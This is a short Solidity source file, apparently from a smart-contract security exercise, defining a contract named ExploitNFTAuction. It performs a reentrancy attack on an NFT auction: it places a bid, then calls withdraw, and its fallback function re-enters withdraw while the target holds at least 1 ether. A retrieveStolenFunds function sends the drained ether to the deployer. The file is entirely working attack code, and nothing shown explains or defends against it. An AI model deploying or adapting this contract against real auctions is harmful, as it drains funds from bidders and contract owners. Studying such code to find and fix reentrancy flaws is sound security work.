// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface NFTAuctionInterface {
	function bid() external payable;

	function withdraw() external;
}

contract ExploitNFTAuction {
	NFTAuctionInterface public auctionInterface;
	address payable owner; 

    constructor(NFTAuctionInterface _auctionInterface) payable {
        auctionInterface = NFTAuctionInterface(_auctionInterface);
        owner = payable(msg.sender);
    }

	function makeBid() public payable {
		auctionInterface.bid{value: msg.value}();
	}

	function exploit() public payable {
        auctionInterface.withdraw();
	}

	fallback() external payable { 
        if(address(auctionInterface).balance >= 1 ether) {
            auctionInterface.withdraw();
	    }
    }

    function getBalance() public view returns(uint) {
		return address(this).balance;
	}

	function retrieveStolenFunds() public {
        owner.transfer(address(this).balance);
	}

}